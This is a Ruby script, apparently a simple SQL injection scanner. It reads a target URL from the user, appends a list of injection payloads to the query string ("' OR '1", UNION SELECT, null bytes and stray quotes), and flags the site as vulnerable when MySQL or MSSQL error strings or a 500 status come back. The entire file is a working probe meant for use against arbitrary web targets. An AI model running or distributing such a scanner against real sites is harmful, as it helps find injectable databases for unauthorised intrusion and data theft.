require 'net/http'
require 'open-uri'

puts """
,-----.  ,------.  ,-----.  ,---.  ,--. ,--.,--. 
|  |) /_ |  .--. ''  .-.  ''   .-' |  .'   /|  | 
|  .-.  \|  '--'.'|  | |  |`.  `-. |  .   ' |  | 
|  '--' /|  |\  \ '  '-'  '.-'    ||  |\   \|  | 
`------' `--' '--' `-----' `-----' `--' '--'`--' 
                                         
"""


def main(url)
    #Some payloads from https://github.com/payloadbox/sql-injection-payload-list          
    payloads = ["'","''","`","``",",",'"','""',     
            "' OR '1", "' OR '' = '", "'='", "'=0--+",  
            "'''''''''''''UNION SELECT '2", "%00", "||", "+","%"
    ]   

    #Some errors found on ghdb

    errors = ["mysql_num_rows()","You have an error in your SQL syntax",
        "mysql_fetch_array()", "mysql_query()", "Microsoft SQL Native Client error.",
        "unexpected end of SQL command"]
    
    if url.end_with?(".php")
        puts "\nWarning: the target does not appear to have a query, default form: target+?q="
        url += "?q="
    end
    payloads.each do |test|
        target = URI.parse(url)
        target.query += test
        response = Net::HTTP.get_response(target)
        if response.code == "200"
            errors.each do |mhmh|
                if response.body.include?(mhmh)
                    puts "\n#{target.to_s} is vulnerable \n#{mhmh}\n\n"
                end
            end
        elsif response.code == "500"
            puts "\n#{target.to_s} is vulnerable \n(500 internal server error)"
        elsif response.code == "403"
            puts "\n403 forbidden :skull:"
        else
            puts "\nStatus code: "+response.code
        end
    end
end

begin
    print "\nTarget: "
    target = gets.chomp
    main(target)
rescue => error
    puts "\nERROR:", error
    puts  "Example target: http://vulnerable.com/index.php?query=69"
end
